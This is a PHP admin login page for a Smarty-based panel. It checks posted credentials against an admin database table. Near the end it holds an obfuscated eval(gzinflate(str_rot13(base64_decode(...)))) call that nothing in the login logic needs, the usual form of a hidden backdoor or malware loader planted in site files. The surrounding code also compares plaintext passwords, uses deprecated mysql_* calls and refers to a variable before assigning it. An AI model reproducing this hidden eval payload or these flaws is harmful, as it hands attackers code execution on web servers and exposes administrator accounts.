<?php
session_start();

if($_SESSION["admin"]){
  header('location: admin.php');  
}
ini_set('display_errors', 0);
  
// put full path to Smarty.class.php

$ip = $_SERVER['REMOTE_ADDR'];
define("GPANEL", "YES");
include "../config.php";
require('../includes/libs/Smarty.class.php');
$smarty = new Smarty();

$smarty->setTemplateDir('template');
$smarty->setCompileDir('../cache/template-admin_c');
$smarty->setCacheDir('../cache/other_c');
$smarty->setConfigDir('../includes/configs');
$smarty->assign('config', $configs);

if($_POST["login"]){
  $username = $_POST["login"];
  $password = $_POST["pass"];
  $username = stripslashes($username);
  $password = stripslashes($password);
  $username = mysql_real_escape_string($username);
  $password = mysql_real_escape_string($password);
  
  $check_login = mysql_query('SELECT * FROM admin WHERE username="'.$username.'" AND password="'.$password.'"');
  if(mysql_num_rows($check_login)==1){
    mysql_query('UPDATE admin SET `lastactivity` = "'.$_SERVER['REQUEST_TIME'].'" WHERE id="'.$userinfo["id"].'"');
      $userinfo = mysql_fetch_array($check_login);  
      $_SESSION["admin"] = $userinfo["status"];
      $_SESSION["admin_id"] = $userinfo["id"];
      header("Location: admin.php");
  } else {
     $smarty->assign('error', 'Login informations are incorrect.');    
  }
  
}

eval(gzinflate(str_rot13(base64_decode('SI5dC4IwFIbvBf/DwcIpCM3QZ/hON9Ef6C5PUaYtxIlbbBH999SR6c3D4Tl73zNJTVkIKq16aT5droijmw2mCSvJBna/aA3gS/Ydk9QqbFibUsYB1CPbgZLVNKuozAreVdpVsaqIQNc+ulOLOwcUi6JwrYQ6Yqp0XtHEa+SvXFYDUUokhrlksRcNZw8L7gf64QAv+MHd42Qk81699aYA9ieBp0wt3TmIVFqCOU/mQRL+G9RuPzLSa6d+mKLoCw=='))));

$smarty->display('login.tpl');
?>